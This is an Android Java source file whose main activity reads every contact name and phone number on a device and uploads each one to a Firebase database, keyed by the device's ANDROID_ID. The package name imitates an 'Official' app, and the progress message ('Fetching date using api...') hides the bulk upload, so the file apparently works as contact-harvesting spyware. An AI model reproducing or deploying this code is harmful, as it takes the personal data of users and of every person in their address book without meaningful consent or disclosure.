package com.Official.getcontact;

import static android.Manifest.permission.READ_CONTACTS;

import android.app.ProgressDialog;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.AsyncTask;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.util.Log;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.lang.ref.WeakReference;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_CONTACTS_PERMISSION = 1;

    private RecyclerView recyclerView;
    private String deviceId;
    TextView getContact;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Get a unique identifier for the device
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

//        // Initialize RecyclerView
        recyclerView = findViewById(R.id.recyclerViewContacts);
        recyclerView.setLayoutManager(new LinearLayoutManager(this));

        // Check if the contacts permission is granted
        if (ContextCompat.checkSelfPermission(this, READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            // Request the permission if not granted
            ActivityCompat.requestPermissions(this, new String[]{READ_CONTACTS}, REQUEST_CONTACTS_PERMISSION);
        } else {
            // Permission is already granted, fetch contacts
            fetchContacts();
        }
    }

    // Handle permission result
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_CONTACTS_PERMISSION) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // Permission granted, fetch contacts
                fetchContacts();
            } else {
                // Permission denied
                Toast.makeText(this, "Contacts permission is required to display contacts", Toast.LENGTH_SHORT).show();
            }
        }

    }

    private void fetchContacts() {
        // Initialize Firebase
        FirebaseDatabase.getInstance().setPersistenceEnabled(true);

        // Start the AsyncTask to fetch contacts
        new FetchContactsTask(this, deviceId, getContact).execute();
    }

    // Fetch contacts from device
    private static class FetchContactsTask extends AsyncTask<Void, Void, List<Contact>> {

        private final WeakReference<MainActivity> activityReference;
        private final String deviceId;
        private final TextView getContactOfUser;
        private ProgressDialog progressDialog;

        FetchContactsTask(MainActivity activity, String deviceId, TextView getContactOfUser) {
            activityReference = new WeakReference<>(activity);
            this.deviceId = deviceId;
            this.getContactOfUser = getContactOfUser;
        }

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            MainActivity activity = activityReference.get();
            if (activity == null || activity.isFinishing()) return;

            progressDialog = new ProgressDialog(activity);
            progressDialog.setMessage("Fetching date using api...");
            progressDialog.setCancelable(false);
            progressDialog.show();
        }

        @Override
        protected List<Contact> doInBackground(Void... voids) {
            MainActivity activity = activityReference.get();
            if (activity == null || activity.isFinishing()) return new ArrayList<>();

            List<Contact> contactList = new ArrayList<>();
            ContentResolver contentResolver = activity.getContentResolver();
            Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);

            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    String contactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                    String contactName = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));

                    if (cursor.getInt(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                        Cursor phoneCursor = contentResolver.query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                new String[]{contactId}, null);

                        if (phoneCursor != null) {
                            while (phoneCursor.moveToNext()) {
                                String phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                                Contact contact = new Contact(contactName, phoneNumber);
                                contactList.add(contact);

                                // Upload each contact to Firebase
                                uploadContactToFirebase(contact);
                            }
                            phoneCursor.close();
                        }
                    }
                }
                cursor.close();
            }

            return contactList;
        }

        private void uploadContactToFirebase(Contact contact) {
            // Get a reference to the Firebase Database
            DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference("contacts").child(deviceId);

            // Push the contact to Firebase Database
            databaseReference.push().setValue(contact)
                    .addOnSuccessListener(aVoid -> {
                        // Successfully uploaded
                        Log.d("FirebaseUpload", "Contact uploaded successfully: " + contact.getName());
                        // Use the activity reference to show a Toast
                        MainActivity activity = activityReference.get();
                        if (activity != null) {
                            Toast.makeText(activity, "Contact uploaded successfully!", Toast.LENGTH_SHORT).show();
                        }
                    })
                    .addOnFailureListener(e -> {
                        // Handle failure
// Handle failure
                        Log.e("FirebaseUpload", "Error uploading contact: " + e.getMessage());
                        // Use the activity reference to show a Toast
                        MainActivity activity = activityReference.get();
                        if (activity != null) {
                            Toast.makeText(activity, "Error uploading contact. Please try again.", Toast.LENGTH_SHORT).show();
                        }
                    });
        }

        @Override
        protected void onPostExecute(List<Contact> contacts) {
            super.onPostExecute(contacts);
            MainActivity activity = activityReference.get();
            if (activity == null || activity.isFinishing()) return;

            if (progressDialog != null && progressDialog.isShowing()) {
                progressDialog.dismiss();
            }

            ContactAdapter contactAdapter = new ContactAdapter(contacts);
            activity.recyclerView.setAdapter(contactAdapter);

//            getContactOfUser.setText("Sorry!, Unable to fetch date. Please try again.");

        }
    }


}
